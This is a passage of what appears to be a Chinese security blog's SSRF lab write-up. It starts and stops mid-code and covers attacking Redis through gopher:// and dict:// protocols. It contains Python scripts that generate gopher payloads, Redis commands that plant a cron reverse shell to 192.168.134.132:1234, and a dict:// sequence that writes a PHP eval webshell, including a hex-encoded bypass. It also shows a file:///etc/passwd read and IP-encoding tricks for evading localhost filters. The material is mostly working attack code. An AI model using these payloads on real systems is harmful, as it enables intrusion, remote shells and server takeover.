class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>CRLF<span class=\"token operator\">+</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">+=</span>CRLF\n    <span class=\"token keyword\">return</span> cmd\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> cmd<span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">+=</span> urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>redis_format<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> payload<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行后得到payload<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150643.png\" alt=\"在这里插入图片描述\"><br>开启靶机环境，去攻击机进行curl + payload<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150948.png\" alt=\"在这里插入图片描述\"></p>\n<p>此时尝试登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150030.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"写contrab计划任务反弹shell\"><a href=\"#写contrab计划任务反弹shell\" class=\"headerlink\" title=\"写contrab计划任务反弹shell\"></a>写contrab计划任务反弹shell</h3><p>条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">redis 有 root\n环境是centos，由于 redis 输出的文件都是 <span class=\"token number\">644</span> 权限，但是 ubuntu 中的定时任务一定要 <span class=\"token number\">600</span> 权限才能实现所以这个方法只适用于 centos<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>靶机开启redis，攻击连接后执行以下指令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">flushall\nset <span class=\"token number\">1</span> <span class=\"token string double-quoted-string\">\"\\n\\n\\n\\n* * * * * root bash -i >&amp; /dev/tcp/192.168.134.132/1234 0>&amp;1\\n\\n\\n\\n\"</span>\nconfig set dir <span class=\"token string single-quoted-string\">'/var/spool/cron'</span>\nconfig set dbfilename root\nsave<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"结合SSRF-2\"><a href=\"#结合SSRF-2\" class=\"headerlink\" title=\"结合SSRF\"></a>结合SSRF</h4><p>脚本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import urllib\nprotocol<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"gopher://\"</span>\nreverse_ip<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"192.168.134.132\"</span>\nreverse_port<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1234\"</span>\nfilename<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"root\"</span>\ncron<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\n\\n\\n\\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\\n\\n\\n\\n\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>reverse_ip<span class=\"token punctuation\">,</span>reverse_port<span class=\"token punctuation\">)</span>\npath<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/var/spool/cron\"</span>\npasswd<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span>\ncmd<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"flushall\"</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string double-quoted-string\">\"set 1 &#123;&#125;\"</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>cron<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string double-quoted-string\">\"config set dir &#123;&#125;\"</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string double-quoted-string\">\"config set dbfilename &#123;&#125;\"</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string double-quoted-string\">\"save\"</span>\n     <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">if</span> passwd<span class=\"token punctuation\">:</span>\n    cmd<span class=\"token operator\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"AUTH &#123;&#125;\"</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span>protocol<span class=\"token operator\">+</span>reverse_ip<span class=\"token operator\">+</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token operator\">+</span>reverse_port<span class=\"token operator\">+</span><span class=\"token string double-quoted-string\">\"/_\"</span>\ndef <span class=\"token function\">redis_format</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">CRLF</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span>\n    redis_arr <span class=\"token operator\">=</span> arr<span class=\"token operator\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span>\n    cmd<span class=\"token operator\">+=</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>redis_arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> x in redis_arr<span class=\"token punctuation\">:</span>\n        cmd<span class=\"token operator\">+=</span><span class=\"token constant\">CRLF</span><span class=\"token operator\">+</span><span class=\"token string double-quoted-string\">\"$\"</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token constant\">CRLF</span><span class=\"token operator\">+</span>x<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">+=</span><span class=\"token constant\">CRLF</span>\n    <span class=\"token keyword\">return</span> cmd\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> x in cmd<span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">+=</span> urllib<span class=\"token operator\">.</span><span class=\"token function\">quote</span><span class=\"token punctuation\">(</span><span class=\"token function\">redis_format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> payload<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行后得到<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150021.png\" alt=\"在这里插入图片描述\"><br>在攻击机上进行监听，同时克隆一个终端进行curl +payload<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150101.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150074.png\" alt=\"在这里插入图片描述\"><br>之后即可成功反弹shell</p>\n<h1 id=\"靶场实战\"><a href=\"#靶场实战\" class=\"headerlink\" title=\"靶场实战\"></a>靶场实战</h1><h2 id=\"SSRF-lab\"><a href=\"#SSRF-lab\" class=\"headerlink\" title=\"SSRF-lab\"></a>SSRF-lab</h2><h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>1、从github上下载靶场<br>代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//gitclone.com/github.com/m6a-UdS/ssrf-lab.git</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150130.png\" alt=\"在这里插入图片描述\"><br>2、切换到靶场路径下制作镜像</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cd <span class=\"token operator\">/</span>ssrf<span class=\"token operator\">-</span>lab<span class=\"token operator\">/</span>basics\nsudo docker build <span class=\"token operator\">-</span>t ssrf<span class=\"token operator\">-</span>lab<span class=\"token operator\">/</span>basic <span class=\"token operator\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150472.png\" alt=\"在这里插入图片描述\"><br>3、运行镜像并映射到80端口</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">docker run <span class=\"token operator\">-</span>d <span class=\"token operator\">-</span>p <span class=\"token number\">80</span><span class=\"token punctuation\">:</span><span class=\"token number\">80</span> ssrf<span class=\"token operator\">-</span>lab<span class=\"token operator\">/</span>basic<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>4、进入容器中配置Redis</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">docker exec <span class=\"token operator\">-</span>it 容器id <span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>bash\napt<span class=\"token operator\">-</span>get install redis<span class=\"token operator\">-</span>server<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150522.png\" alt=\"在这里插入图片描述\"><br>5、开启Redis服务</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">redis<span class=\"token operator\">-</span>server<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150572.png\" alt=\"在这里插入图片描述\"><br>访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150865.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"收集信息\"><a href=\"#收集信息\" class=\"headerlink\" title=\"收集信息\"></a>收集信息</h3><p>先测127.0.0.1<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150610.png\" alt=\"在这里插入图片描述\"><br>发现有回显，说明对ip没有限制，此时尝试读取文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file<span class=\"token punctuation\">:</span><span class=\"token comment\">///etc/passwd</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150639.png\" alt=\"在这里插入图片描述\"><br>获取到密码，此时再用dict伪协议读取redis信息</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379/info</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150201.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"构造webshell\"><a href=\"#构造webshell\" class=\"headerlink\" title=\"构造webshell\"></a>构造webshell</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150221.png\" alt=\"在这里插入图片描述\"><br>此时我们是没有shell.php的，我们尝试写入一个shell.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379/config:set:dir/var/www/html //设置目录</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150242.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict://127.0.0.1:6379/set:shell:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>\" //设置文件内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150246.png\" alt=\"在这里插入图片描述\"><br>发现未成功，尝试十六进制绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379/set:shell:\"\\x3c\\x3f\\x70\\x68\\x70\\x20\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150281.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379/config:set:dbfilename:shell.php //设置文件名</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150704.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">dict<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:6379/save //保存</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150763.png\" alt=\"在这里插入图片描述\"><br>去靶机中查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150784.png\" alt=\"在这里插入图片描述\"><br>成功写入</p>\n<h2 id=\"靶场实战-1\"><a href=\"#靶场实战-1\" class=\"headerlink\" title=\"靶场实战\"></a>靶场实战</h2><h3 id=\"URL-and-IP-PASS-1\"><a href=\"#URL-and-IP-PASS-1\" class=\"headerlink\" title=\"URL and IP PASS\"></a>URL and IP PASS</h3><h4 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'http'</span><span class=\"token operator\">||</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'https'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/localhost|127.0.0/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$ch</span><span class=\"token operator\">=</span><span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这个多了<code>parse_url</code>函数，这个函数的作用如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">parse_url — 解析 <span class=\"token constant\">URL</span>，返回其组成部分<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n$url <span class=\"token operator\">=</span> 'http<span class=\"token operator\">:</span><span class=\"token comment\">//username:password@hostname/path?arg=value#anchor';</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span>$url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\necho <span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span>$url<span class=\"token punctuation\">,</span> PHP_URL_PATH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>输出结果</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">Array</span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">[</span>scheme<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> http\n    <span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> hostname\n    <span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> username\n    <span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> password\n    <span class=\"token punctuation\">[</span>path<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>path\n    <span class=\"token punctuation\">[</span>query<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> arg<span class=\"token operator\">=</span>value\n    <span class=\"token punctuation\">[</span>fragment<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> anchor\n<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">/</span>path<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话就是要求是http或者https，然后呢不能出现<code>loca1host</code>或者<code>127.0.0</code>，仔细看的话，会发现这里是<code>loca1</code>而非<code>local</code>，同时<code>127.0.0</code>防不了<code>127.0.0.1</code>，因此是可以沿用上关思路的，不过这里的考点是这个127.0.0.1的绕过，这里给出几个payload</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">//特殊0</span>\nurl<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//0/flag.php</span>\nurl<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//0.0.0/flag.php</span>\n<span class=\"token comment\">//进制绕过</span>\nurl<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//0177.0.0.1/flag.php //八进制</span>\nurl<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//0x7f.0.0.1/flag.php //十六进制</span>\nurl<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//2130706433/flag.php  //十进制</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'http'</span><span class=\"token operator\">||</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'https'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$host</span><span class=\"token operator\">=</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$ch</span><span class=\"token operator\">=</span><span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" 